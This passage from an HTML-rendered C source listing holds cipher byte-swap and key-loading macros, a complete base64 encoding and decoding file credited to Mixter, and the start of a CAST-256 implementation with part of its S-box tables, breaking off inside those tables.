<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[2] = io_swap(in_key[5]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[3] = io_swap(in_key[4]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[4] = io_swap(in_key[3]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[5] = io_swap(in_key[2]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[6] = io_swap(in_key[1]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[7] = io_swap(in_key[0]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">#else</font>
<br><font color="#3333FF">#define get_block(x)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[0] = io_swap(in_blk[0]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[1] = io_swap(in_blk[1]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[2] = io_swap(in_blk[2]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[3] = io_swap(in_blk[3])</font>
<br><font color="#3333FF">#define put_block(x)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; out_blk[0] = io_swap(((u4byte*)(x))[0]);&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; out_blk[1] = io_swap(((u4byte*)(x))[1]);&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; out_blk[2] = io_swap(((u4byte*)(x))[2]);&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; out_blk[3] = io_swap(((u4byte*)(x))[3])</font>
<br><font color="#3333FF">#define get_key(x,len)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[4] = ((u4byte*)(x))[5]
=&nbsp;&nbsp;&nbsp;&nbsp; \</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[6] = ((u4byte*)(x))[7]
= 0;&nbsp; \</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; switch((((len) + 63) / 64))
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case 4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[6] = io_swap(in_key[6]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[7] = io_swap(in_key[7]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case 3:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[4] = io_swap(in_key[4]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[5] = io_swap(in_key[5]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case 2:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[0] = io_swap(in_key[0]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[1] = io_swap(in_key[1]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[2] = io_swap(in_key[2]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[3] = io_swap(in_key[3]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">#endif</font>
<p><font color="#3333FF">#ifdef&nbsp; BLOCK_SWAP</font>
<br><font color="#3333FF">#define BYTE_SWAP</font>
<br><font color="#3333FF">#define WORD_SWAP</font>
<br><font color="#3333FF">#endif</font>
<p><font color="#3333FF">#endif</font>
<br>
<hr WIDTH="100%">
<center><font color="#FF0000"><font size=+1>base64.c</font></font></center>

<p><font color="#FF0000">/* base64 encoding/decoding functions by Mixter
*/</font>
<p><font color="#FF0000">const char b64[] =</font>
<br><font color="#FF0000">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";</font>
<p><font color="#FF0000">char ascii[256] =</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
64, 64, 64, 64, 64, 64,</font>
<br><font color="#FF0000">&nbsp; 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
64, 64, 64, 64, 64, 64,</font>
<br><font color="#FF0000">&nbsp; 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
64, 62, 64, 64, 64, 63,</font>
<br><font color="#FF0000">&nbsp; 52, 53, 54, 55, 56, 57, 58, 59, 60, 61,
64, 64, 64, 64, 64, 64,</font>
<br><font color="#FF0000">&nbsp; 64, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
11, 12, 13, 14,</font>
<br><font color="#FF0000">&nbsp; 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
25, 64, 64, 64, 64, 64,</font>
<br><font color="#FF0000">&nbsp; 64, 26, 27, 28, 29, 30, 31, 32, 33, 34,
35, 36, 37, 38, 39, 40,</font>
<br><font color="#FF0000">&nbsp; 41, 42, 43, 44, 45, 46, 47, 48, 49, 50,
51, 64, 64, 64, 64, 64,</font>
<br><font color="#FF0000">&nbsp; 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
64, 64, 64, 64, 64, 64,</font>
<br><font color="#FF0000">&nbsp; 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
64, 64, 64, 64, 64, 64,</font>
<br><font color="#FF0000">&nbsp; 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
64, 64, 64, 64, 64, 64,</font>
<br><font color="#FF0000">&nbsp; 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
64, 64, 64, 64, 64, 64,</font>
<br><font color="#FF0000">&nbsp; 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
64, 64, 64, 64, 64, 64,</font>
<br><font color="#FF0000">&nbsp; 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
64, 64, 64, 64, 64, 64,</font>
<br><font color="#FF0000">&nbsp; 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
64, 64, 64, 64, 64, 64,</font>
<br><font color="#FF0000">&nbsp; 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
64, 64, 64, 64, 64, 64</font>
<br><font color="#FF0000">};</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">base64_in (unsigned char *buf, char *obuf, int
len)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; int i;</font>
<br><font color="#FF0000">&nbsp; for (i = 0; i &lt; len - 2; i += 3)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *obuf++ = b64[(buf[i]
>> 2) &amp; 0x3F];</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *obuf++ = b64[((buf[i]
&amp; 0x3) &lt;&lt; 4 | ((int) (buf[i + 1] &amp; 0xF0) >> 4))];</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *obuf++ = b64[((buf[i
+ 1] &amp; 0xF) &lt;&lt; 2) | ((int) (buf[i + 2] &amp; 0xC0) >> 6)];</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *obuf++ = b64[buf[i
+ 2] &amp; 0x3F];</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; if (i &lt; len)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *obuf++ = b64[(buf[i]
>> 2) &amp; 0x3F];</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (i == (len
- 1))</font>
<br><font color="#FF0000">&nbsp;{</font>
<br><font color="#FF0000">&nbsp;&nbsp; *obuf++ = b64[((buf[i] &amp; 0x3)
&lt;&lt; 4)];</font>
<br><font color="#FF0000">//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *obuf++
= '=';</font>
<br><font color="#FF0000">&nbsp;}</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</font>
<br><font color="#FF0000">&nbsp;{</font>
<br><font color="#FF0000">&nbsp;&nbsp; *obuf++ = b64[((buf[i] &amp; 0x3)
&lt;&lt; 4 | ((int) (buf[i + 1] &amp; 0xf0) >> 4))];</font>
<br><font color="#FF0000">&nbsp;&nbsp; *obuf++ = b64[((buf[i + 1] &amp;
0xf) &lt;&lt; 2)];</font>
<br><font color="#FF0000">&nbsp;}</font>
<br><font color="#FF0000">//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *obuf++ = '=';</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; *obuf++ = '\0';</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">base64_out (char *buf, unsigned char *obuf, int
len)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; int nprbytes;</font>
<br><font color="#FF0000">&nbsp; char *p = buf;</font>
<br><font color="#FF0000">&nbsp; while (ascii[(int) *(p++)] &lt;= 63);</font>
<p><font color="#FF0000">&nbsp; nprbytes = len - 1;</font>
<p><font color="#FF0000">&nbsp; while (nprbytes > 4 &amp;&amp; *buf !=
'\0')</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(obuf++) = (ascii[(int)
*buf] &lt;&lt; 2 | ascii[(int) buf[1]] >> 4);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(obuf++) = (ascii[(int)
buf[1]] &lt;&lt; 4 | ascii[(int) buf[2]] >> 2);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(obuf++) = (ascii[(int)
buf[2]] &lt;&lt; 6 | ascii[(int) buf[3]]);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buf += 4;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nprbytes -= 4;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; if (nprbytes > 1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; *(obuf++) =</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (ascii[(int) *buf]
&lt;&lt; 2 | ascii[(int) buf[1]] >> 4);</font>
<br><font color="#FF0000">&nbsp; if (nprbytes > 2)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; *(obuf++) =</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (ascii[(int) buf[1]]
&lt;&lt; 4 | ascii[(int) buf[2]] >> 2);</font>
<br><font color="#FF0000">&nbsp; if (nprbytes > 3)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; *(obuf++) =</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (ascii[(int) buf[2]]
&lt;&lt; 6 | ascii[(int) buf[3]]);</font>
<br><font color="#FF0000">&nbsp; *(obuf)++ = '\0';</font>
<br><font color="#FF0000">}</font>
<br>
<hr WIDTH="100%">
<center><font color="#3333FF"><font size=+1>cast.c</font></font></center>

<p><font color="#3333FF">/*</font>
<br><font color="#3333FF">&nbsp;* this is cast-256 (c) Carlisle Adams of
Entrust Tecnhologies</font>
<br><font color="#3333FF">&nbsp;* implementation written by Dr Brian Gladman
(gladman@seven77.demon.co.uk)</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;* You can also use other encryption candidates
for AES to do encrypted</font>
<br><font color="#3333FF">&nbsp;* sessions, see the documentation on how
to do this.</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;*/</font>
<p><font color="#3333FF">#define BYTE_SWAP</font>
<p><font color="#3333FF">#ifdef CORE_TIME</font>
<br><font color="#3333FF">#undef BYTE_SWAP</font>
<br><font color="#3333FF">#endif</font>
<p><font color="#3333FF">#include "aes.h"</font>
<p><font color="#3333FF">u4byte s_box[4][256] =</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x30fb40d4, 0x9fa0ff0b, 0x6beccd2f,
0x3f258c7a, 0x1e213f2f, 0x9C004dd3,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x6003e540, 0xcf9fc949, 0xbfd4af27,
0x88bbbdb5, 0xe2034090, 0x98d09675,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x6e63a0e0, 0x15c361d2, 0xc2e7661d,
0x22d4ff8e, 0x28683b6f, 0xc07fd059,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xff2379c8, 0x775f50e2, 0x43c340d3,
0xdf2f8656, 0x887ca41a, 0xa2d2bd2d,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xa1c9e0d6, 0x346c4819, 0x61b76d87,
0x22540f2f, 0x2abe32e1, 0xaa54166b,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x22568e3a, 0xa2d341d0, 0x66db40c8,
0xa784392f, 0x004dff2f, 0x2db9d2de,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x97943fac, 0x4a97c1d8, 0x527644b7,
0xb5f437a7, 0xb82cbaef, 0xd751d159,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x6ff7f0ed, 0x5a097a1f, 0x827b68d0,
0x90ecf52e, 0x22b0c054, 0xbc8e5935,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x4b6d2f7f, 0x50bb64a2, 0xd2664910,
0xbee5812d, 0xb7332290, 0xe93b159f,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xb48ee411, 0x4bff345d, 0xfd45c240,
0xad31973f, 0xc4f6d02e, 0x55fc8165,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xd5b1caad, 0xa1ac2dae, 0xa2d4b76d,
0xc19b0C50, 0x882240f2, 0x0c6e4f38,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xa4e4bfd7, 0x4f5ba272, 0x564c1d2f,
0xc59c5319, 0xb949e354, 0xb04669fe,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xb1b6ab8a, 0xc71358dd, 0x6385c545,
0x110f935d, 0x57538ad5, 0x6a390493,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xe63d37e0, 0x2a54f6b3, 0x3a787d5f,
0x6276a0b5, 0x19a6fcdf, 0x7a42206a,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x29f9d4d5, 0xf61b1891, 0xbb72275e,
0xaa508167, 0x38901091, 0xc6b505eb,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x84c7cb8c, 0x2ad75a0f, 0x874a1427,
0xa2d1936b, 0x2ad286af, 0xaa56d291,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xd7894360, 0x425c750d, 0x93b39e26,
0x187184c9, 0x6c00b32d, 0x73e2bb14,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xa0bebc3c, 0x54623779, 0x64459eab,
0x3f328b82, 0x7718cf82, 0x59a2cea6,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x04ee002e, 0x89fe78e6, 0x3fab0950,
0x325ff6C2, 0x81383f05, 0x6963c5c8,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x76cb5ad6, 0xd49974c9, 0xca180dcf,
0x380782d5, 0xc7fa5cf6, 0x8ac31511,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x35e79e13, 0x47da91d0, 0xf40f9086,
0xa7e2419e, 0x31366241, 0x051ef495,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xaa573b04, 0x4a805d8d, 0x548300d0,
0x00322a3c, 0xbf64cddf, 0xba57a68e,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x75c6372b, 0x50afd341, 0xa7c13275,
0x915a0bf5, 0x6b54bfab, 0x2b0b1426,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xab4cc9d7, 0x449ccd82, 0xf7fbf265,
0xab85c5f3, 0x1b55db94, 0xaad4e324,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xcfa4bd3f, 0x2deaa3e2, 0x9e204d02,
0xc8bd25ac, 0xeadf55b3, 0xd5bd9e98,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xe31231b2, 0x2ad5ad6c, 0x954329de,
0xadbe4528, 0xd8710f69, 0xaa51c90f,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xaa786bf6, 0x22513f1e, 0xaa51a79b,
0x2ad344cc, 0x7b5a41f0, 0xd37cfbad,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x1b069505, 0x41ece491, 0xb4c332e6,
0x032268d4, 0xc9600acc, 0xce387e6d,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xbf6bb16c, 0x6a70fb78, 0x0d03d9c9,
0xd4df39de, 0xe01063da, 0x4736f464,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x5ad328d8, 0xb347cc96, 0x75bb0fc3,
0x98511bfb, 0x4ffbcc35, 0xb58bcf6a,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xe11f0abc, 0xbfc5fe4a, 0xa70aec10,
0xac39570a, 0x3f04442f, 0x6188b153,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xe0397a2e, 0x5727cb79, 0x9ceb418f,
0x1cacd68d, 0x2ad37c96, 0x0175cb9d,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xc69dff09, 0xc75b65f0, 0xd9db40d8,
0xec0e7779, 0x4744ead4, 0xb11c3274,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xdd24cb9e, 0x7e1c54bd, 0xf01144f9,
0xd2240eb1, 0x9675b3fd, 0xa3ac3755,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xd47c27af, 0x51c85f4d, 0x56907596,
0xa5bb15e6, 0x580304f0, 0xca042cf1,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x011a37ea, 0x8dbfaadb, 0x35ba3e4a,
0x3526ffa0, 0xc37b4d09, 0xbc306ed9,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x98a52666, 0x5648f725, 0xff5e569d,
0x0ced63d0, 0x7c63b2cf, 0x700b45e1,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xd5ea50f1, 0x85a92872, 0xaf1fbda7,
0xd4234870, 0xa7870bf3, 0x2d3b4d79,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x42e04198, 0x0cd0ede7, 0x26470db8,
0xf881814C, 0x474d6ad7, 0x7c0c5e5c,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xd1231959, 0x381b7298, 0xf5d2f4db,
0xab838653, 0x6e2f1e23, 0x83719c9e,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xbd91e046, 0x9a56456e, 0xdc39200c,
0x20c8c571, 0x962bda1c, 0xe1e696ff,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xb141ab08, 0x7cca89b9, 0x1a69e783,
0x02cc4843, 0xa2f7c579, 0x429ef47d,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x427b169c, 0x5ac9f049, 0xdd8f0f00,
0x5c8165bf</font>
<br><font color="#3333FF">&nbsp; },</font>
<br><font color="#3333FF">&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x1f201094, 0xef0ba75b, 0x69e3cf7e,
0x393f4380, 0xfe61cf7a, 0xeec5207a,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x55889c94, 0x72fc0651, 0xada7ef79,
0x4e1d7235, 0xd55a63ce, 0xde0436ba,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x99c430ef, 0x5f0c0794, 0x18dcdb7d,
0xa1d6eff3, 0xa0b52f7b, 0x59e83605,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xee15b094, 0xe9ffd909, 0xdc440086,
0xef944459, 0xba83ccb3, 0xe0c3cdfb,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xd1da4181, 0x3b092ab1, 0xf997f1c1,
0xa5e6cf7b, 0x01420ddb, 0xe4e7ef5b,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x25a1ff41, 0xe180f806, 0x1fc41080,
0x179bee7a, 0xd37ac6a9, 0xfe5830a4,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x98de8b7f, 0x77e83f4e, 0x79929269,
0x24fa9f7b, 0xe113c85b, 0xacc40083,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xd7503525, 0xf7ea615f, 0x62143154,
0x0d554b63, 0x5d681121, 0xc866c359,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x3d63cf73, 0xcee234c0, 0xd4d87e87,
0x5c672b21, 0x071f6181, 0x39f7627f,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x361e3084, 0xe4eb573b, 0x602f64a4,
0xd63acd9c, 0x1bbc4635, 0x9e81032d,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x2701f50c, 0x99847ab4, 0xa0e3df79,
0xba6cf38c, 0x10843094, 0x2537a95e,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xf46f6ffe, 0xa1ff3b1f, 0x208cfb6a,
0x8f458c74, 0xd9e0a227, 0x4ec73a34,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xfc884f69, 0x3e4de8df, 0xef0e0088,
0x3559648d, 0x8a45388c, 0x1d804366,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x721d9bfd, 0xa58684bb, 0xe8256333,
0x844e8212, 0x128d8098, 0xfed33fb4,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xce280ae1, 0x27e19ba5, 0xd5a6c252,
0xe49754bd, 0xc5d655dd, 0xeb667064,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x77840b4d, 0xa1b6a801, 0x84db26a9,
0xe0b56714, 0x21f043b7, 0xe5d05860,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x54f03084, 0x066ff472, 0xa31aa153,
0xdadc4755, 0xb5625dbf, 0x68561be6,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x83ca6b94, 0x2d6ed23b, 0xeccf01db,
0xa6d3d0ba, 0xb6803d5c, 0xaf77a709,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x33b4a34c, 0x397bc8d6, 0x5ee22b95,
0x5f0e5304, 0x81ed6f61, 0x20e74364,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xb45e1378, 0xde18639b, 0x881ca122,
0xb96726d1, 0x8049a7e8, 0x22b7da7b,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x5e552d25, 0x5272d237, 0x79d2951c,
0xc60d894c, 0x488cb402, 0x1ba4fe5b,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xa4b09f6b, 0x1ca815cf, 0xa20c3005,
0x8871df63, 0xb9de2fcb, 0x0cc6c9e9,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x0beeff53, 0xe3214517, 0xb4542835,
0x9f63293c, 0xee41e729, 0x6e1d2d7c,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x50045286, 0x1e6685f3, 0xf33401c6,
0x30a22c95, 0x31a70850, 0x60930f13,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x73f98417, 0xa1269859, 0xec645c44,
0x52c877a9, 0xcdff33a6, 0xa02b1741,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x7cbad9a2, 0x2180036f, 0x50d99c08,
0xcb3f4861, 0xc26bd765, 0x64a3f6ab,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x80342676, 0x25a75e7b, 0xe4e6d1fc,
0x20c710e6, 0xcdf0b680, 0x17844d3b,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x31eef84d, 0x7e0824e4, 0x2ccb49eb,
0x846a3bae, 0x8ff77888, 0xee5d60f6,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x7af75673, 0x2fdd5cdb, 0xa11631c1,
0x30f66f43, 0xb3faec54, 0x157fd7fa,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xef8579cc, 0xd152de58, 0xdb2ffd5e,
0x8f32ce19, 0x306af97a, 0x02f03ef8,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x99319ad5, 0xc242fa0f, 0xa7e3ebb0,
0xc68e4906, 0xb8da230c, 0x80823028,</font>
